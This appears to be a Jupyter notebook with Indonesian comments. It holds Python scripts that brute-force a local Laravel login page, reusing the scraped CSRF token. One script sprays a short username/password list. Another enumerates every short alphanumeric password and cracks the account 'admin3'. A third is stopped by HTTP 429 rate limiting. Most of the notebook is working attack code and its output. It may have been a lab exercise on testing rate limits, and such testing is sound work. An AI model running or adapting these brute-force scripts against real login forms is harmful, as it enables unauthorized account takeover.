# %%
import requests
from bs4 import BeautifulSoup
import itertools
import string

# %%
# URL form login dan URL proses login
form_url = "http://127.0.0.1:8000/"
post_url = "http://127.0.0.1:8000/login"

usernames = ["user", "admin"]
passwords = ["123456", "user123", "password", "admin123", "secret"]

# Bikin session
session = requests.Session()

# 1. Ambil halaman form login
resp = session.get(form_url)
soup = BeautifulSoup(resp.text, "html.parser")

# Ambil CSRF token
csrf_token = soup.find("input", {"name": "_token"})["value"]
print(f"[INFO] Token ditemukan: {csrf_token}")

for username in usernames:
    for password in passwords:
        data = {
            "_token": csrf_token,
            "username": username,  # sesuai controller
            "password": password
        }

        login_resp = session.post(post_url, data=data, allow_redirects=False)

        # Laravel redirect (302) berarti login sukses
        if login_resp.status_code == 302:
            location = login_resp.headers.get('Location', '')
            if '/admin' in location or '/user' in location:
                print(f"[✅] Berhasil login: {username} | {password}")
            else:
                print(f"[❌] Gagal login: {username} | {password}")
        else:
            print(f"[❌] Gagal login: {username} | {password}")
# Out:
# [INFO] Token ditemukan: 51Q6ciHOJ30crNfeZm2MJXCSWXPeAoThMxYjrFUC

# %%
form_url = "http://127.0.0.1:8000/"
post_url = "http://127.0.0.1:8000/login"

username = "admin3"  # username target

session = requests.Session()
resp = session.get(form_url)
soup = BeautifulSoup(resp.text, "html.parser")
csrf_token = soup.find("input", {"name": "_token"})["value"]
print(f"[INFO] Token ditemukan: {csrf_token}")

chars = string.ascii_lowercase + string.digits  # karakter yang dicoba
max_length = 4  # panjang maksimal password yang dicoba

found = False
attempt = 0  # counter percobaan

for length in range(1, max_length + 1):
    for pw_tuple in itertools.product(chars, repeat=length):
        attempt += 1
        password = ''.join(pw_tuple)

        # Tampilkan progres setiap 100 percobaan
        if attempt % 100 == 0:
            print(f"[PROGRESS] Sudah mencoba {attempt} password...")

        data = {
            "_token": csrf_token,
            "username": username,
            "password": password
        }

        login_resp = session.post(post_url, data=data, allow_redirects=False)

        if login_resp.status_code == 302:
            location = login_resp.headers.get('Location', '')
            if '/bukus' in location or '/dashboard' in location:
                print(f"[✅] Berhasil login: {username} | {password}")
                found = True
                break

    if found:
        break

if not found:
    print(f"[❌] Password tidak ditemukan setelah {attempt} percobaan.")
# Out:
# [INFO] Token ditemukan: 4nzW5rTf7oVZPI5eOJAyMEqHNGBu5FHQ9qhTeYd3
# [PROGRESS] Sudah mencoba 100 password...
# [PROGRESS] Sudah mencoba 200 password...
# [PROGRESS] Sudah mencoba 300 password...
# [PROGRESS] Sudah mencoba 400 password...
# [PROGRESS] Sudah mencoba 500 password...
# [PROGRESS] Sudah mencoba 600 password...
# [PROGRESS] Sudah mencoba 700 password...
# [PROGRESS] Sudah mencoba 800 password...
# [PROGRESS] Sudah mencoba 900 password...
# [PROGRESS] Sudah mencoba 1000 password...
# [PROGRESS] Sudah mencoba 1100 password...
# [PROGRESS] Sudah mencoba 1200 password...
# [PROGRESS] Sudah mencoba 1300 password...
# [✅] Berhasil login: admin3 | aab

# %%
form_url = "http://127.0.0.1:8000/"
post_url = "http://127.0.0.1:8000/login"

username = "user9"  # username target

session = requests.Session()
resp = session.get(form_url)
soup = BeautifulSoup(resp.text, "html.parser")
csrf_token = soup.find("input", {"name": "_token"})["value"]
print(f"[INFO] Token ditemukan: {csrf_token}")

chars = string.ascii_lowercase + string.digits  # karakter yang dicoba
max_length = 4  # panjang maksimal password yang dicoba

found = False
attempt = 0  # counter percobaan

for length in range(1, max_length + 1):
    for pw_tuple in itertools.product(chars, repeat=length):
        attempt += 1
        password = ''.join(pw_tuple)

        # Tampilkan progres setiap 100 percobaan
        if attempt % 100 == 0:
            print(f"[PROGRESS] Sudah mencoba {attempt} password...")

        data = {
            "_token": csrf_token,
            "username": username,
            "password": password
        }

        login_resp = session.post(post_url, data=data, allow_redirects=False)

        if login_resp.status_code == 429:
            print("[❌] Percobaan dibatasi, silakan tunggu beberapa saat.")
            break

        if login_resp.status_code == 302:
            location = login_resp.headers.get('Location', '')
            if '/bukus' in location or '/dashboard' in location:
                print(f"[✅] Berhasil login pada percobaan ke: {attempt}")
                print(f"[INFO] Username ditemukan: {username}")
                print(f"[INFO] Password ditemukan: {password}")
                found = True
                break

    if found:
        break

if not found:
    print(f"[❌] Password tidak ditemukan setelah {attempt} percobaan.")
# Out:
# [INFO] Token ditemukan: qXYk4sAo7eq6yzCXbEJqQXWjjHij2hM7xNlWZgAH
# [❌] Percobaan dibatasi, silakan tunggu beberapa saat.
# [❌] Percobaan dibatasi, silakan tunggu beberapa saat.
# [❌] Percobaan dibatasi, silakan tunggu beberapa saat.
# [❌] Percobaan dibatasi, silakan tunggu beberapa saat.
# [❌] Password tidak ditemukan setelah 9 percobaan.
